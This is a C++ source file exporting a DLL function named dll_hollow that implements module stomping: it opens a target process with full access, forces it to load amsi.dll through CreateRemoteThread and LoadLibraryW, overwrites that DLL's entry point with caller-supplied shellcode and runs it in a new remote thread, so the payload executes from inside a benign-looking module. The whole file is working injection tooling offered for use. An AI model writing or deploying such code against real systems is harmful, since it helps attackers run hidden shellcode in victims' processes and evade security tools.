#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include<psapi.h>
#include <iostream>

extern "C" {
	int __declspec(dllexport) dll_hollow(unsigned char* addr, int size, int pid) {
		unsigned char shellcode[460] = {};
		for (int i = 0; i < size; i++) {
			shellcode[i] = *(addr + i);
		}
		wchar_t module[] = L"C:\\Windows\\System32\\amsi.dll";
		HMODULE modules_present[256] = {};

		// injects amsi.dll into process
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
		PVOID buffer = VirtualAllocEx(hProcess, NULL, sizeof module, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(hProcess, buffer, module, sizeof module, NULL);
		PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		HANDLE dllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, buffer, 0, NULL);
		WaitForSingleObject(dllThread, 0xffffffff);

		// before the injected module is loaded
		DWORD mod_size = 0;
		EnumProcessModules(hProcess, modules_present, sizeof modules_present, &mod_size);
		int modules_count = mod_size / sizeof(HMODULE);
		for (int i = 0; i < modules_count; i++) {
			HMODULE remote_module = modules_present[i];
			char mod_name[128] = {};
			int t = GetModuleBaseNameA(hProcess, remote_module, mod_name, sizeof mod_name);
			if (std::string(mod_name).compare("amsi.dll") == 0) {
				DWORD headerBufferSize = 0x1000;
				LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
				ReadProcessMemory(hProcess, remote_module, targetProcessHeaderBuffer, headerBufferSize, NULL);

				PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
				PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
				LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remote_module);

				// write shellcode to DLL's AddressofEntryPoint
				WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, sizeof shellcode, NULL);
				// execute shellcode from inside the benign DLL
				CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
				return 0;
			}
		}
		return -1;
	}
}